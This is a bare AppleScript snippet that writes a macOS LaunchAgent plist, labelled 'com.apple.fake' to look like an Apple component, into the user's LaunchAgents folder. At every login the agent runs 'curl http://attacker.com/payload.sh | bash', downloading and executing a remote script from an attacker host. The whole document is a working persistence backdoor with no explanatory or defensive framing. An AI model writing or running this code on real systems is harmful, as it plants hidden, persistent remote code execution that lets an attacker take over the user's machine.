do shell script "echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
  <key>Label</key>
  <string>com.apple.fake</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>curl http://attacker.com/payload.sh | bash</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.fake.plist"
